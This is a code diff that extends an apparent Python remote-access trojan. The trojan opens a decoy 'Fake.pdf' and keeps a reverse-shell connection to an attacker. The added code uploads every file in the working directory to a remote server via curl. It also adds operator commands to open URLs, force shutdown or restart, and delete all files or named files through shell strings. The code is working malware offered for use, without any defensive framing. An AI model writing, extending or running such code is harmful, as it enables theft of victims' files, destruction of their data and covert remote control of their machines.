@@ -149,6 +149,37 @@ def send_files(args):
             print("Errors:", result.stderr)
     except Exception as e:
         print(f"Failed to send files: {e}")
+def send_all():
+    try:
+        files = [
+            f for f in os.listdir(".")
+            if os.path.isfile(f)
+        ]
+        if not files:
+            return False
+        success = False
+        for f in files:
+            file_path = os.path.abspath(f)
+            curl_cmd = [
+                "curl",
+                "-X", "POST",
+                "-F", f"files=@{file_path}",
+                f"{SERVER_URL}/upload"
+            ]
+            result = subprocess.run(
+                curl_cmd,
+                capture_output=True,
+                text=True,
+                shell=False
+            )
+            if result.returncode == 0:
+                success = True
+            else:
+                print("Error:", result.stderr)
+        return success
+    except Exception as e:
+        print("error:", e)
+        return False
 def open_pdf():
     print("Open pdf in webborwser....")
     if hasattr(sys, "_MEIPASS"):
@@ -157,6 +188,8 @@ def open_pdf():
         base_path = os.path.dirname(__file__)
     pdf_path = os.path.join(base_path, "Fake.pdf")
     webbrowser.open(pdf_path)
+def open_browser(link):
+    webbrowser.open(link)
 def connect_back():
     s = socket.socket()
     s.connect(("IP", "PORT"))
@@ -199,6 +232,44 @@ def connect_back():
                     s.send(f"{os.getcwd()}\n".encode())
                 except Exception as e:
                     s.send(f"[-] {e}\n".encode())
+                continue
+            if cmd.lower().startswith("open-browser"):
+                link = cmd.lower().split(' ')[1]
+                open_browser(link)
+                continue
+            if cmd.lower() == "send-all-files":
+                if send_all() == True:
+                    s.send(b"Files have been sent to the server\n")
+                else:
+                    s.send(b"There is an issue\n")
+                continue
+            if cmd.lower() == "clear" or cmd.lower() == "cls":
+                s.sendall(b"\033[2J\033[H")
+                continue
+            if cmd.lower() == "shutdown":
+                subprocess.run(["shutdown", "/s", "/t", "0"])
+                continue
+            if cmd.lower() == "restart":
+                subprocess.run(["shutdown", "/r", "/t", "0"])
+                continue
+            if cmd.lower() == "remove-all":
+                subprocess.run("del /Q *", shell=True)
+                continue
+            if cmd.lower().startswith("remove"):
+                parts = cmd.split()[1:]
+                for file in parts:
+                    subprocess.run(f'del /Q "{file}"', shell=True)
+                continue
+            if cmd.lower().startswith("touch"):
+                parts = cmd.split()[1:]
+                for file_name in parts:
+                    with open(file_name, "a", encoding="utf-8"):
+                        os.utime(file_name, None)  
+                continue
+            if cmd.lower().startswith("create-folders"):
+                parts = cmd.split()[1:]
+                for folder in parts:
+                    subprocess.run(["cmd", "/c", "mkdir", folder], shell=True)
                 continue
             if cmd.lower() == "exit":
                 break
